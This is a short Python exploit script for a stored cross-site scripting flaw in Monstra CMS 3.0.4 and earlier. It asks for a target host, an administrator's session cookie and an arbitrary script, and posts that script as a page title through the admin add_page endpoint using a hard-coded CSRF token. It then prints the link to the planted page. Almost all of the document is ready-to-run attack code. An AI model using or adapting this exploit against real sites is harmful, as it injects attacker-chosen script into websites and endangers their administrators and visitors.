# Author: DEEPIN2
# Software: Monstra CMS
# Version: 3.0.4 and earlier
# This automation code requires Python3
# You must intercept the first request through the proxy tool to verify the CSRF token.
 
import requests
import re
 
def runXSS(target, cookie, data):
    exploit = requests.post(target, cookies=cookie, data=data).text
    if re.search(&#039;exploit&#039;, exploit):
        return &#039;OK&#039;
    else:
        return &#039;ERROR&#039;
     
if __name__ == &#039;__main__&#039;:
    print(&#039;&#039;&#039;  ______     _______     ____   ___  _  ___        _  ___  _ _  ___
 / ___\ \   / / ____|   |___ \ / _ \/ |( _ )      / |/ _ \/ / |( _ )
| |    \ \ / /|  _| _____ __) | | | | |/ _ \ _____| | | | | | |/ _ `
| |___  \ V / | |__|_____/ __/| |_| | | (_) |_____| | |_| | | | (_) |
 \____|  \_/  |_____|   |_____|\___/|_|\___/      |_|\___/|_|_|\___/
    [*] Author : DEEPIN2(Junseo Lee)
---------------------------------------------------------------------&#039;&#039;&#039;)
    print(&#039;[*] Ex) http://www.target.com -> www.target.com&#039;)
    url = input(&#039;Target : &#039;)
    print(&#039;[*] Required admin\&#039;s PHPSESSID.&#039;)
    PHPSESSID = input(&#039;PHPSESSID : &#039;)
    pagename = input(&#039;Pagename : &#039;)
    script = input(&#039;Script : &#039;)
    target = &#039;http://&#039; + url + &#039;/admin/index.php?id=pages&action=add_page&#039;
    cookie = {&#039;PHPSESSID&#039;:PHPSESSID}
    data = {&#039;csrf&#039;:&#039;9c1763649f4e5ce611d29ef5cd10914fa61e91f5&#039;,\
            &#039;page_title&#039;:script,\
            &#039;page_name&#039;:pagename,\
            &#039;page_meta_title&#039;:&#039;&#039;,\
            &#039;page_keywords&#039;:&#039;&#039;,\
            &#039;page_description&#039;:&#039;&#039;,\
            &#039;pages&#039;:0,\
            &#039;templates&#039;:&#039;index&#039;,\
            &#039;status&#039;:&#039;published&#039;,\
            &#039;access&#039;:&#039;public&#039;,\
            &#039;editor&#039;:&#039;&#039;,\
            &#039;page_tags&#039;:&#039;&#039;,\
            &#039;add_page_and_exit&#039;:&#039;Save+and+Exit&#039;,\
            &#039;page_date&#039;:&#039;9999-99-99&#039;}
 
    result = runXSS(target, cookie, data)
    print(&#039;-&#039; * 69)
    if result == &#039;OK&#039;:
        print(&#039;[+] LINK : http://&#039; + url + &#039;/&#039; + pagename)
    else:
        print(&#039;[-] Error&#039;)

